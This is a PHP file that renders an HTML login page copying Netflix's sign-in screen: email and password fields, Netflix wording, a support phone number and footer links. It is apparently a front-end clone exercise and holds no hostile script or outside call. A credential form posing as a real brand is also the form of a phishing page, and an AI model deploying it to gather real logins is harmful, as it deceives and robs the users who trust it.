<?php
function login() {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Page</title>
        <link rel="stylesheet" href="/Brainstorm/assets/css/login.css?v=<?php echo time(); ?>">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.0/font/bootstrap-icons.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="logo">
            <img src="/Brainstorm/assets/images/logo.svg" alt="Logo">
        </div>

        <main>
            <div class="login-container">
                <h2>Sign In</h2>
                <form class="login-form" id="login-form" action="/login/process" method="post">
                    <div class="input-group">
                        <input class="gaya-input" type="text" id="karma-user" name="karma-user" placeholder="Email or mobile number">
                        <label for="karma-user">Email or mobile number</label>
                        <div class="pesan-error">
                            <small id="user-error" class="error-message"></small>
                        </div>
                    </div>
                    <div class="input-group password-container">
                        <input class="gaya-input" type="password" id="karma-password" name="karma-password" placeholder="Password">
                        <label for="karma-password">Password</label>
                        <span id="toggle-password" class="bi bi-eye" onclick="togglePassword(event)"></span>
                        <div class="pesan-error">
                            <small id="password-error" class="error-message"></small>
                        </div>
                    </div>
                    <button type="submit" class="login-btn">Sign In</button>
                    <p class="forgot-password"><a>Forgot password?</a></p>
                    <div class="checkbox-container">
                        <input type="checkbox" id="remember-me" class="custom-checkbox">
                        <label for="remember-me">Remember me</label>
                    </div>
                    <div class="newto">
                        <p> New to Netflix? <a> Sign up now. </a> </p>
                    </div>
                    <div class="recaptcha-text">
                        <p> This page is protected by Google reCAPTCHA to ensure you're not a bot. <a> Learn more. </a></p>
                    </div>
                </form>
            </div>
        </main>

        <footer>
            <div class="question">
                <p>Questions? <a>Call 1-844-505-2993</a></p>
            </div>
            <div class="footer-links-1">
                <a>FAQ</a>
                <a>Help Center</a>
                <a>Netflix Shop</a>
                <a>Terms of Use</a>
            </div>
            <div class="footer-links-2">
                <a>Privacy</a>
                <a>Cookie Preferences</a>
                <a>Corporate Information</a>
                <a>Do Not Sell or Share My Personal Information</a>
                <a class="ad-choices">Ad Choices</a>
            </div>
            <div class="english-select">
                <div class="custom-dropdown">
                    <div class="dropdown-selected">
                        <i class="bi bi-globe"></i> English
                    </div>
                    <div class="dropdown-options">
                        <div class="dropdown-option" data-value="english"><i class="bi bi-translate"></i> English</div>
                        <div class="dropdown-option" data-value="spanish"><i class="bi bi-translate"></i> Spanish</div>
                        <div class="dropdown-option" data-value="french"><i class="bi bi-translate"></i> French</div>
                        <div class="dropdown-option" data-value="german"><i class="bi bi-translate"></i> German</div>
                        <div class="dropdown-option" data-value="chinese"><i class="bi bi-translate"></i> Chinese</div>
                    </div>
                </div>
            </div>
                
        </footer>
        <script src="/Brainstorm/assets/js/login.js" defer></script>
    </body>
    </html>
    
    <?php
    }
?>